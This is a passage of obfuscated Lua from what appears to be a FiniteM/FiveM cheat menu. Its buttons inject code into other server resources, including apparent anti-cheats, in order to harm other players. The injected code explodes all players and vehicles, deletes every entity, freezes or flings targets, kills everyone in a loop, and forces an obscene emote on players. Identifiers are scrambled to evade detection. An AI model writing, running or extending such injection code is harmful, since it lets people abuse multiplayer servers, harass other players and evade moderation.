            TzYuIoPlMnBvCxZa()
        ]]):format(v157));end break;end end end);MachoMenuButton(v33[2 -1 ],"Give All Nearby Objects",function() local v158=0 -0 ;local v159;while true do if (v158==(0 -0)) then v159=MachoMenuGetSelectedPlayer();if (v159 and (v159>(0 + 0))) then MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,([[
            local function TzYuIoPlMnBvCxZa()
                local xWcErTvBnMzLp = %d

                local aGhJkLpOiUyTr = _G.GetPlayerPed
                local bUiOpLkJhGfDs = _G.DoesEntityExist
                local cPzWsXcEdCvBnM = _G.GetEntityCoords
                local dRtYuIoPlMnBgF = _G.SetEntityCoords
                local eAsDfGhJkLqWe = _G.RequestControlOfEntity or RequestCtrlOverEntity
                local fZxCvBnMqWeRt = _G.NetworkRequestControlOfEntity
                local gXcVbNmZqWeRt = _G.SetEntityAsMissionEntity

                local function iRequest(obj)
                    fZxCvBnMqWeRt(obj)
                    eAsDfGhJkLqWe(obj)
                    gXcVbNmZqWeRt(obj, true, true)
                end

                CreateThread(function()
                    Wait(0)

                    local targetPed = aGhJkLpOiUyTr(xWcErTvBnMzLp)
                    if not bUiOpLkJhGfDs(targetPed) then return end
                    local coords = cPzWsXcEdCvBnM(targetPed)

                    for obj in EnumerateObjects() do
                        if bUiOpLkJhGfDs(obj) then
                            iRequest(obj)
                            dRtYuIoPlMnBgF(obj, coords.x, coords.y, coords.z, false, false, false, false)
                        end
                    end
                end)
            end

            TzYuIoPlMnBvCxZa()

        ]]):format(v159));end break;end end end);MachoMenuButton(v33[4 -3 ],"Teleport To Player",function() local v160=MachoMenuGetSelectedPlayer();if (v160 and (v160>(753 -(239 + 514)))) then MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,([[
            local function GhJkUiOpLzXcVbNm()
                local kJfHuGtFrDeSwQa = %d
                local oXyBkVsNzQuH = GetPlayerPed
                local zXcVbNmQwErTyUi = GetEntityCoords
                local xAsDfGhJkLpOiU = SetEntityCoords

                local myPed = PlayerPedId()
                local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                local targetCoords = zXcVbNmQwErTyUi(targetPed)

                xAsDfGhJkLpOiU(myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
            end

            GhJkUiOpLzXcVbNm()
        ]]):format(v160));end end);MachoMenuButton(v33[1 + 0 ],"Kick From Vehicle",function() local v161=MachoMenuGetSelectedPlayer();if (v161 and (v161>(1329 -(797 + 532)))) then MachoInjectResource((v41("ReaperV4") and "ReaperV4") or (v41("oxmysql") and "oxmysql") or (v41("monitor") and "monitor") or "any" ,([[
            local function GhJkUiOpLzXcVbNm()
                local kJfHuGtFrDeSwQa = %d
                local oXyBkVsNzQuH = _G.GetPlayerPed
                local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                local wQeRtYuIoPlMn = _G.PlayerPedId
                local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                local veh = yZaSdFgHjKlQ(targetPed, 0)

                local function nMzXcVbNmQwErTy(func, ...)
                    local _print = print
                    local function errorHandler(ex)
                        -- _print("SCRIPT ERROR: " .. ex)
                    end

                    local argsStr = ""
                    for _, v in ipairs({...}) do
                        if type(v) == "string" then
                            argsStr = argsStr .. "\"" .. v .. "\", "
                        elseif type(v) == "number" or type(v) == "boolean" then
                            argsStr = argsStr .. tostring(v) .. ", "
                        else
                            argsStr = argsStr .. tostring(v) .. ", "
                        end
                    end
                    argsStr = argsStr:sub(1, -3)

                    local script = string.format("return func(%%s)", argsStr)
                    local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                    if not fn then
                        -- _print("Error loading script: " .. err)
                        return nil
                    end

                    local success, result = xpcall(function() return fn() end, errorHandler)
                    if not success then
                        -- _print("Error executing script: " .. result)
                        return nil
                    else
                        return result
                    end
                end

                if veh ~= 0 then
                    Wait(100)
                    nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                    ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                    
                    Wait(100)
                    nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                end
            end

            GhJkUiOpLzXcVbNm()
        ]]):format(v161));end end);MachoMenuButton(v33[1 + 0 ],"Freeze Player",function() local v162=0 + 0 ;local v163;while true do if (v162==(0 -0)) then v163=MachoMenuGetSelectedPlayer();if (v163 and (v163>0)) then MachoInjectResource((v41("ReaperV4") and "ReaperV4") or (v41("oxmysql") and "oxmysql") or (v41("monitor") and "monitor") or "any" ,([[
            local function VtQzAfXyYu()
                local RqTfBnLpZo = %d
                local FgTrLpYwVs = GetPlayerPed
                local EoKdCjXqMg = GetEntityCoords
                local ZbLpVnXwQr = GetClosestVehicle
                local WqErTyUiOp = PlayerPedId
                local AsDfGhJkLz = SetPedIntoVehicle
                local PoLiKjUhYg = ClearPedTasks
                local QwErTyUiOp = NetworkRequestControlOfEntity
                local CxZvBnMaSd = GetGameTimer
                local VcMnBgTrEl = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local wfjaw4dtdu = CreateThread
                local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                local tgtCoords = EoKdCjXqMg(tgtPed)
                local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                if not veh or veh == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                QwErTyUiOp(veh)
                Wait(100)
                AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                VcMnBgTrEl(200)
                PoLiKjUhYg(WqErTyUiOp())

                wfjaw4dtdu(function()
                    local start = CxZvBnMaSd()
                    while CxZvBnMaSd() - start < 3000 do
                        TeAxSpDoMj(
                            veh,
                            tgtPed,
                            0.0, 0.0, 10.0,
                            10.0, 0.0, 0.0,
                            true, 0, 0,
                            false, false, 0
                        )
                        VcMnBgTrEl(0)
                    end
                end)
            end

            VtQzAfXyYu()
        ]]):format(v163));end break;end end end);MachoMenuButton(v33[1],"Glitch Player",function() local v164=1202 -(373 + 829) ;local v165;while true do if (v164==0) then v165=MachoMenuGetSelectedPlayer();if (v165 and (v165>(731 -(476 + 255)))) then MachoInjectResource((v41("ReaperV4") and "ReaperV4") or (v41("oxmysql") and "oxmysql") or (v41("monitor") and "monitor") or "any" ,([[
            local function TnXmLoPrVq()
                local kPdZoWxNq = %d

                local LsKjHgFdSa = GetPlayerPed
                local ZxCvBnMaQw = GetEntityCoords
                local QtRvBnPoLs = GetClosestVehicle
                local VcBgTrElMn = PlayerPedId
                local KdJfGhTyPl = SetPedIntoVehicle
                local TrLkUyIoPl = ClearPedTasks
                local MwZlQxNsTp = NetworkRequestControlOfEntity
                local AsYtGhUiMn = GetGameTimer
                local WqErTyUiOp = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local CrXeTqLpVi = CreateThread

                local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                if not jCaBnErYqK or jCaBnErYqK == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                MwZlQxNsTp(veh)
                Wait(100)
                KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                WqErTyUiOp(200)
                TrLkUyIoPl(VcBgTrElMn())

                CrXeTqLpVi(function()
                    local tGhXpLsMkA = AsYtGhUiMn()
                    local bErXnPoVlC = 3000

                    while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                        TeAxSpDoMj(
                            jCaBnErYqK,
                            xGyPtMdLoB,
                            0, 0, 0,
                            2000.0, 1460.928, 1000.0,
                            10.0, 88.0, 600.0,
                            true, true, true, false, 0
                        )
                        WqErTyUiOp(0)
                    end
                end)
            end

            TnXmLoPrVq()
        ]]):format(v165));end break;end end end);MachoMenuButton(v33[1],"Limbo Player",function() local v166=MachoMenuGetSelectedPlayer();if (v166 and (v166>(1130 -(369 + 761)))) then MachoInjectResource((v41("ReaperV4") and "ReaperV4") or (v41("oxmysql") and "oxmysql") or (v41("monitor") and "monitor") or "any" ,([[
            local function VyTxQzWsCr()
                local lDxNzVrMpY = %d

                local FgTrLpYwVs = GetPlayerPed
                local EoKdCjXqMg = GetEntityCoords
                local ZbLpVnXwQr = GetClosestVehicle
                local WqErTyUiOp = PlayerPedId
                local AsDfGhJkLz = SetPedIntoVehicle
                local PoLiKjUhYg = ClearPedTasks
                local QwErTyUiOp = NetworkRequestControlOfEntity
                local CxZvBnMaSd = GetGameTimer
                local VcMnBgTrEl = Wait
                local TeAxSpDoMj = AttachEntityToEntityPhysically
                local CrXeTqLpVi = CreateThread

                local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                    print("No vehicle nearby | Aborting.")
                    return
                end

                QwErTyUiOp(veh)
                Wait(100)
                AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                VcMnBgTrEl(200)
                PoLiKjUhYg(WqErTyUiOp())

                CrXeTqLpVi(function()
                    local kYqPmTnVzL = CxZvBnMaSd()
                    local yTbQrXlMwA = 3000
                    local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                    while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                        TeAxSpDoMj(
                            cHvBzNtEkQ,
                            vUpYrTnMwE,
                            0, 0, 0,
                            hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                            true, true, true, true, 0
                        )
                        VcMnBgTrEl(0)
                    end
                end)
            end

            VyTxQzWsCr()
        ]]):format(v166));end end);MachoMenuButton(v33[1 + 0 ],"Copy Appearance",function() local v167=MachoMenuGetSelectedPlayer();if (v167 and (v167>0)) then MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,([[
            local function AsDfGhJkLqWe()
                local ZxCvBnMqWeRt = %d
                local UiOpAsDfGhJk = GetPlayerPed
                local QwErTyUiOpAs = PlayerPedId
                local DfGhJkLqWeRt = DoesEntityExist
                local ErTyUiOpAsDf = ClonePedToTarget

                local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                    local YpAsDfGhJkLq = QwErTyUiOpAs()
                    ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                end
            end

            AsDfGhJkLqWe()
        ]]):format(v167));end end);MachoMenuButton(v33[1 -0 ],"Force Robbery",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        Citizen.CreateThread(function()
    local playerPed = PlayerPedId()
    local playerId = GetPlayerServerId(PlayerId())

    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    Citizen.Wait(20000)
    TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
end)
    ]]);end);MachoMenuButton(v33[3 -1 ],"Crash [VIP Only]",function() MachoInjectResource((v41("ReaperV4") and "ReaperV4") or (v41("FiniAC") and "FiniAC") or (v41("WaveShield") and "WaveShield") or (v41("monitor") and "monitor") or "any" ,[[
    ]]);end);MachoMenuButton(v33[240 -(64 + 174) ],"Cone Everyone",function() local v168=0;local v169;local v170;local v171;while true do if (v168==(1 + 1)) then function v170(v299) local v300=0;local v301;local v302;local v303;while true do if (v300==2) then SetEntityCollision(v302,false,false);SetEntityInvincible(v302,true);v300=3 -0 ;end if (v300==0) then if ( not DoesEntityExist(v299) or IsEntityDead(v299)) then return;end v301=GetEntityCoords(v299);v300=337 -(144 + 192) ;end if (v300==(217 -(42 + 174))) then v302=CreateObject(v169,v301.x,v301.y,v301.z,true,true,false);SetEntityAsMissionEntity(v302,true,true);v300=2 + 0 ;end if (v300==3) then SetEntityCanBeDamaged(v302,false);v303=GetPedBoneIndex(v299,25751 + 5335 );v300=2 + 2 ;end if (v300==4) then AttachEntityToEntity(v302,v299,v303,1504 -(363 + 1141) ,1580 -(1183 + 397) ,0.25 -0 ,0,0 + 0 ,0 + 0 ,false,false,true,false,1977 -(1913 + 62) ,true);break;end end end v170(PlayerPedId());v168=2 + 1 ;end if (v168==(7 -4)) then for v304,v305 in ipairs(GetActivePlayers()) do v170(GetPlayerPed(v305));end v171=(GetGamePool and GetGamePool("CPed")) or {} ;v168=4;end if (v168==(1934 -(565 + 1368))) then while  not HasModelLoaded(v169) do Wait(0 -0 );end v170=nil;v168=1663 -(1477 + 184) ;end if (v168==(5 -1)) then for v306,v307 in ipairs(v171) do if  not IsPedAPlayer(v307) then v170(v307);end end break;end if (v168==(0 + 0)) then v169=GetHashKey("prop_roadcone02a");RequestModel(v169);v168=1;end end end);MachoMenuButton(v33[2],"Explode All Players",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function fGhJkLpOiUzXcVb()
            local aSdFgHjKlQwErTy = GetActivePlayers
            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = GetEntityCoords
            local hGjFkDlSaPwOeIr = AddOwnedExplosion
            local tYuIoPaSdFgHjKl = PlayerPedId

            local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
            for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                    local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                    hGjFkDlSaPwOeIr(
                        tYuIoPaSdFgHjKl(),
                        nMzXcVbNmQwErTy.x,
                        nMzXcVbNmQwErTy.y,
                        nMzXcVbNmQwErTy.z,
                        6,     -- Explosion type
                        1.0,   -- Damage scale
                        true,  -- Audible
                        false, -- Invisible
                        0.0    -- Camera shake
                    )
                end
            end
        end

        fGhJkLpOiUzXcVb()
    ]]);end);MachoMenuButton(v33[858 -(564 + 292) ],"Explode All Vehicles",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function uYhGtFrEdWsQaZx()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = GetEntityCoords
            local vBnMkLoPiUyTrEw = AddOwnedExplosion
            local nMzXcVbNmQwErTy = PlayerPedId

            local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
            local me = nMzXcVbNmQwErTy()
            for _, veh in ipairs(_vehicles) do
                if xAsDfGhJkLpOiUz(veh) then
                    local pos = cVbNmQwErTyUiOp(veh)
                    vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                end
            end
        end
        uYhGtFrEdWsQaZx()
    ]]);end);MachoMenuButton(v33[2 -0 ],"Delete All Vehicles",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function zXcVbNmQwErTyUi()
            local aSdFgHjKlQwErTy = GetGamePool
            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
            local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
            local tYuIoPaSdFgHjKl = DeleteEntity
            local yUiOpAsDfGhJkLz = PlayerPedId
            local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
            local gJkLoPiUyTrEqWe = GetGameTimer
            local fDeSwQaZxCvBnMm = Wait

            local me = yUiOpAsDfGhJkLz()
            local myVeh = uIoPaSdFgHjKlQw(me, false)

            local vehicles = aSdFgHjKlQwErTy("CVehicle")
            for _, veh in ipairs(vehicles) do
                if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                    mNbVcCxZzLlKkJj(veh)
                    local timeout = gJkLoPiUyTrEqWe() + 500
                    while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                        fDeSwQaZxCvBnMm(0)
                    end
                    if hGjFkDlSaPwOeIr(veh) then
                        tYuIoPaSdFgHjKl(veh)
                    end
                end
            end
        end
        zXcVbNmQwErTyUi()
    ]]);end);MachoMenuButton(v33[2],"Delete All Peds",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function qWeRtYuIoPlMnBv()
            local zXcVbNmQwErTyUi = GetGamePool
            local aSdFgHjKlQwErTy = DoesEntityExist
            local pOiUyTrEeRwQtYy = DeleteEntity
            local mNbVcCxZzLlKkJj = PlayerId
            local hGjFkDlSaPwOeIr = GetPlayerPed
            local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
            local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
            local uIoPaSdFgHjKlQw = GetGameTimer
            local gJkLoPiUyTrEqWe = Wait
            local vBnMkLoPiUyTrEw = IsPedAPlayer

            local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
            local peds = zXcVbNmQwErTyUi("CPed")

            for _, ped in ipairs(peds) do
                if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                    tYuIoPaSdFgHjKl(ped)
                    local timeout = uIoPaSdFgHjKlQw() + 500
                    while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                        gJkLoPiUyTrEqWe(0)
                    end
                    if yUiOpAsDfGhJkLz(ped) then
                        pOiUyTrEeRwQtYy(ped)
                    end
                end
            end
        end
        qWeRtYuIoPlMnBv()
    ]]);end);MachoMenuButton(v33[2],"Delete All Objects",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function mNqAzXwSeRdTfGy()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = DeleteEntity
            local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
            local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
            local yUiOpAsDfGhJkLz = GetGameTimer
            local uIoPaSdFgHjKlQw = Wait

            local objects = rTyUiOpAsDfGhJk("CObject")
            for _, obj in ipairs(objects) do
                if xAsDfGhJkLpOiUz(obj) then
                    vBnMkLoPiUyTrEw(obj)
                    local timeout = yUiOpAsDfGhJkLz() + 500
                    while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                        uIoPaSdFgHjKlQw(0)
                    end
                    if nMzXcVbNmQwErTy(obj) then
                        cVbNmQwErTyUiOp(obj)
                    end
                end
            end
        end
        mNqAzXwSeRdTfGy()
    ]]);end);MachoMenuButton(v33[5 -3 ],"ShowIDs [New Feature]",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local displayIDs = false -- toggles both self + nearby IDs

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(0.5, 0.5)
        SetTextColour(255, 255, 255, 255)
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        -- Toggle both IDs with E
        if IsControlJustPressed(0, 38) then
            displayIDs = not displayIDs
        end

        if displayIDs then
            -- Draw own ID
            local playerId = GetPlayerServerId(PlayerId())
            SetTextFont(0)
            SetTextProportional(1)
            SetTextScale(0.3, 0.3)
            SetTextColour(255, 255, 255, 255)
            SetTextEntry("STRING")
            AddTextComponentString("Your Player ID: " .. playerId)
            DrawText(0.5, 0.1)

            -- Draw nearby players' IDs
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local players = GetActivePlayers()

            for _, player in ipairs(players) do
                local targetPed = GetPlayerPed(player)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local dist = #(playerCoords - targetCoords)

                    if dist < 40.0 then
                        local targetId = GetPlayerServerId(player)
                        DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                    end
                end
            end
        end
    end
end)
    ]]);end);MachoMenuCheckbox(v33[306 -(244 + 60) ],"Kill Everyone",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
        aSwDeFgHiJkLoPx = true

        local function pLoMkIjUhbGyTf()
            local mAxPlErOy = PlayerPedId()
            local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
            local gBvTnCuXe = 100
            local aSdFgHjKl = 1000.0
            local lKjHgFdSa = 300.0

            local nBxMzLqPw = CreateThread
            local qWeRtYuiOp = ShootSingleBulletBetweenCoords

            nBxMzLqPw(function()
                while aSwDeFgHiJkLoPx and not Unloaded do
                    Wait(gBvTnCuXe)
                    local bNmZxSwEd = GetActivePlayers()
                    local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                    for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                        local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                        if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                            local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                            if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                local xScVbNmAz = vector3(
                                    eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                    eDxCfVgBh.z + 1.2
                                )

                                local dFgHjKlZx = vector3(
                                    eDxCfVgBh.x,
                                    eDxCfVgBh.y,
                                    eDxCfVgBh.z + 0.2
                                )

                                qWeRtYuiOp(
                                    xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                    dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                    aSdFgHjKl,
                                    true,
                                    rVtNiUcEx,
                                    mAxPlErOy,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        pLoMkIjUhbGyTf()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        aSwDeFgHiJkLoPx = false
    ]]);end);MachoMenuCheckbox(v33[2],"Permanent Kill Everyone",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
        qWeRtYuIoPlMnAb = true

        local function bZxLmNcVqPeTyUi()
            local vBnMkLoPi = PlayerPedId()
            local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
            local eDxCfVgBh = 100
            local lKjHgFdSa = 1000.0
            local mAxPlErOy = 300.0

            local rTwEcVzUi = CreateThread
            local oPiLyKuJm = ShootSingleBulletBetweenCoords

            rTwEcVzUi(function()
                while qWeRtYuIoPlMnAb and not Unloaded do
                    Wait(eDxCfVgBh)
                    local aSdFgHjKl = GetActivePlayers()
                    local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                    for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                        local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                        if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                            local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                            if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                local jUiKoLpMq = vector3(
                                    zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.z + 1.2
                                )

                                local cReAtEtHrEaD = vector3(
                                    zAsXcVbNm.x,
                                    zAsXcVbNm.y,
                                    zAsXcVbNm.z + 0.2
                                )

                                oPiLyKuJm(
                                    jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                    cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                    lKjHgFdSa,
                                    true,
                                    wQaSzXedC,
                                    vBnMkLoPi,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        bZxLmNcVqPeTyUi()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        qWeRtYuIoPlMnAb = false
    ]]);end);local v45=MachoMenuInputbox(v34[1 + 0 ],"Coords:","x, y, z");MachoMenuButton(v34[477 -(41 + 435) ],"Teleport to Coords",function() local v172=MachoMenuGetInputbox(v45);if (v172 and (v172~="")) then local v250,v251,v252=v172:match("([^,]+),%s*([^,]+),%s*([^,]+)");v250=tonumber(v250);v251=tonumber(v251);v252=tonumber(v252);if (v250 and v251 and v252) then MachoInjectResource((v41("monitor") and "monitor") or "any" ,string.format([[
                local function b0NtdqLZKW()
                    local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                    local nHgFdSaZxCvBnMq = PlayerPedId
                    local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                    local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                    local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                    local x, y, z = %f, %f, %f
                    local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                    if found then z = gZ + 1.0 end

                    local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                    uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                end

                b0NtdqLZKW()
            ]],v250,v251,v252));end end end);MachoMenuButton(v34[1002 -(938 + 63) ],"Waypoint",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function xQX7uzMNfb()
            local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
            local zXcVbNmQwErTyUi = DoesBlipExist
            local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
            local lKjHgFdSaPlMnBv = PlayerPedId
            local qWeRtYuIoPlMnBv = SetEntityCoords

            local function XcVrTyUiOpAsDfGh()
                local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
            end

            local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
            if GhTyUoLpZmNbVcXq then
                local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
            end
        end

        xQX7uzMNfb()
    ]]);end);MachoMenuButton(v34[1],"FIB Building",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function HAZ6YqLRbM()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 140.43, -750.52, 258.15
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        HAZ6YqLRbM()
